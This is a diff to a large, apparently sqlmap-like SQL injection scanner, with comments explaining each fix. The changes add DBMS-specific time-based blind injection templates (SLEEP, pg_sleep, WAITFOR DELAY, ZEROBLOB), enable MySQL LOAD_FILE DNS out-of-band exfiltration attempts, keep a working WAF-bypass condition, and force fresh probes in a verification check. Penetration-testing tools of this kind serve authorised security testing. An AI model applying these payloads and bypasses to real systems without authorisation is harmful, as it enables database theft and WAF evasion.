@@ -56493,9 +56493,63 @@ class Scanner:
                                     _or_not_replaced = True
                                     break
                             if not _or_not_replaced:
-                                # No static condition found and not stacked — append AND as last resort
-                                _template = _body + " AND [INFERENCE]"
-                                LOG.info("[Inference] Template (boolean-append): %s", _template[:80])
+                                # RC-1 FIX: When technique is timing but the payload is too
+                                # obfuscated for regex detection (_has_timing=False) OR no static
+                                # boolean condition was found, the old boolean-append fallback
+                                # produced `SLEEP(3) AND [INFERENCE]` where SLEEP fires
+                                # unconditionally for BOTH true and false probes.  Calibration
+                                # then measures margin≈0–13ms << _min_viable_margin (2400ms for
+                                # 3s sleep) → oracle declared UNRELIABLE → all extraction aborts.
+                                # Fix: for timing techniques, append a DBMS-specific conditional
+                                # timing expression that gates a *new* SLEEP on [INFERENCE].
+                                # The existing _body (which contains the unconditional SLEEP that
+                                # the WAF already allows) supplies the injection context so the
+                                # tamper chain is preserved.  The conditional SLEEP acts as the
+                                # bit-oracle on top of it.  Calibration will observe:
+                                #   TRUE probe  ≈ 2×sleep  (unconditional + conditional)
+                                #   FALSE probe ≈ 1×sleep  (unconditional only)
+                                #   margin ≈ sleep_duration >> _min_viable_margin  → oracle OK
+                                _TIMING_TECHS_INF = frozenset({'T', 'TH', 'HQ', 'BT'})
+                                if _det_tech_inf in _TIMING_TECHS_INF:
+                                    _ts_inf     = getattr(enum.config, "time_sec", 5) or 5
+                                    _ts_int_inf = max(1, int(round(_ts_inf)))
+                                    _ts_mm_inf  = _ts_int_inf // 60
+                                    _ts_ss_inf  = _ts_int_inf % 60
+                                    if _dbms in ("MySQL", "MariaDB", "TiDB", "H2"):
+                                        _template = (_body +
+                                                     f" AND IF([INFERENCE],SLEEP({_ts_inf}),0)")
+                                    elif _dbms in ("PostgreSQL", "CockroachDB",
+                                                   "YugabyteDB", "Amazon Redshift"):
+                                        _template = (_body +
+                                                     f" AND (CASE WHEN [INFERENCE] THEN"
+                                                     f" pg_sleep({_ts_inf}) ELSE NULL END)"
+                                                     f" IS NULL")
+                                    elif _dbms in ("MSSQL", "Sybase"):
+                                        _template = (_body +
+                                                     f"; IF [INFERENCE] WAITFOR DELAY"
+                                                     f" '0:{_ts_mm_inf:02d}:{_ts_ss_inf:02d}'")
+                                    elif _dbms == "Oracle":
+                                        _template = (_body +
+                                                     f" AND (CASE WHEN [INFERENCE] THEN"
+                                                     f" DBMS_SESSION.SLEEP({_ts_inf})"
+                                                     f" ELSE 1 END)=1")
+                                    elif _dbms == "SQLite":
+                                        _zb_inf = min(_ts_int_inf * 800_000, 4_500_000)
+                                        _template = (_body +
+                                                     f" AND CASE WHEN [INFERENCE] THEN"
+                                                     f" LIKE('X',HEX(ZEROBLOB({_zb_inf})))"
+                                                     f" ELSE 0 END=0")
+                                    else:
+                                        # Generic fallback: MySQL-style IF
+                                        _template = (_body +
+                                                     f" AND IF([INFERENCE],SLEEP({_ts_inf}),0)")
+                                    LOG.info("[Inference] Template (timing-cond-append rc1): %s",
+                                             _template[:80])
+                                else:
+                                    # No static condition found and not stacked — boolean-append
+                                    _template = _body + " AND [INFERENCE]"
+                                    LOG.info("[Inference] Template (boolean-append): %s",
+                                             _template[:80])
 
         # FIX: Strip WAF-blocked '>0' suffix from generate_series/count(*) subqueries.
         # HQ detection payloads end with '))>0' — the WAF blocks the '>' operator at the
@@ -67117,10 +67171,24 @@ class Scanner:
                         if not _oob_file_priv_confirmed:
                             _adv_payloads_pre = [(n, p) for (n, p) in _adv_payloads if 'LOAD_FILE' not in p.upper()]
                             if not _adv_payloads_pre:
+                                # RC-3 FIX: Old code set _adv_payloads = [] here, silently
+                                # skipping ALL MySQL DNS OOB because LOAD_FILE payloads were
+                                # filtered out when FILE privilege was not confirmed.  For MySQL
+                                # this eliminated DNS OOB entirely — even when FILE privilege
+                                # DOES exist (detection just didn't confirm it via LOAD_FILE in
+                                # the detection payload).  LOAD_FILE returning NULL (no privilege)
+                                # fires no DNS query but costs only one HTTP request; the OAST
+                                # callback server's silence is the only reliable signal of failure.
+                                # Fix: attempt LOAD_FILE payloads regardless, logging that FILE
+                                # privilege is unconfirmed. If the callback server captures a
+                                # response → privilege confirmed + data extracted. If not → silent
+                                # no-op, no worse than before.  Remove the hard skip.
                                 LOG.warning("[SideChannel] %s OOB: only LOAD_FILE UNC payloads available "
-                                            "but FILE privilege not confirmed by detection — skipping "
-                                            "AdvancedDNSExfil to avoid silent NULL returns", _dbms)
-                            _adv_payloads = _adv_payloads_pre
+                                            "and FILE privilege not confirmed by detection — attempting "
+                                            "anyway (LOAD_FILE NULL→no DNS callback→silent no-op).", _dbms)
+                                # _adv_payloads left as-is (includes LOAD_FILE payloads)
+                            else:
+                                _adv_payloads = _adv_payloads_pre
                     # BUG-DNS-EXFIL-STACK-PREFIX FIX: The old code used
                     # _original_clean + ";" + _adv_p which ignores the injection context.
                     # For string-context injection (WHERE name='test'), the original
@@ -114223,7 +114291,18 @@ class TechniqueCascadeEngine:
             # BUG-V27-9 FIX: Normalised from 9-space to 12-space indent (4 spaces per level).
             # The previous 9-space indent was syntactically valid Python but broke static
             # analysis tools, made nesting depth ambiguous, and caused misleading diff output.
-            _d_fps = _check_a_fps.copy()
+            #
+            # RC-5 FIX: Check D must be FULLY INDEPENDENT of Check A.
+            # Old: `_d_fps = _check_a_fps.copy()` seeded Check D with Check A's probe
+            # responses and only made fresh probes when Check A was incomplete.  When Check A
+            # had valid "true"/"false" entries, Check D reused them — the two checks then shared
+            # an HTTP response set, violating the independence requirement.  A false-positive
+            # body-diff in Check A (e.g. CDN non-determinism, timing artefact, or WAF challenge)
+            # silently carried over into Check D, making it appear to confirm the same signal
+            # from a different angle when in fact it was evaluating the same cached response.
+            # Fix: always start Check D with an empty dict, forcing the fresh-probe path below
+            # to run on every PCV invocation and produce an independent response pair.
+            _d_fps = {}   # RC-5: always fresh — do not inherit Check A responses
             if not _d_fps.get("true") or not _d_fps.get("false"):
                 # BUG-D1 FIX: Independent probes for Check D must cover BOTH string-context AND
                 # numeric-context injection.  Previous code only used string-context canary
@@ -146050,7 +146129,19 @@ class ExtractionBypassFinder:
                 # so WAF pattern-matches on "identifier(" miss the split form.
                 _working_wrapper = None
                 _working_tag     = ""
-                _cond_tests = self.always_true_conditions(self.dbms)
+                # RC-2 FIX: Phase 1 confirmed that _ebf_p1_true passes the WAF
+                # inside this structural template (true=Xms >> thresh).  Phase 2
+                # previously started fresh with always_true_conditions() which does
+                # NOT include _ebf_p1_true.  If every always_true_condition() entry
+                # was WAF-blocked (e.g. version()>='0', @@hostname, catalog queries
+                # all rejected) while the structurally simpler _ebf_p1_true passes,
+                # Phase 2 set _working_wrapper=None and called `continue` — discarding
+                # the structural bypass entirely despite Phase 1 confirming it works.
+                # Fix: prepend (_ebf_p1_true, "") as the first Phase-2 test so the
+                # confirmed condition is tried with wrapper='{cond}' first.  This
+                # sets _working_wrapper='{cond}' and _working_tag='' immediately,
+                # allowing Phase 2.5 to then upgrade to extraction-grade conditions.
+                _cond_tests = [(_ebf_p1_true, "")] + self.always_true_conditions(self.dbms)
                 _outer_break = False
                 for _wrap in wrappers:
                     if _outer_break: break
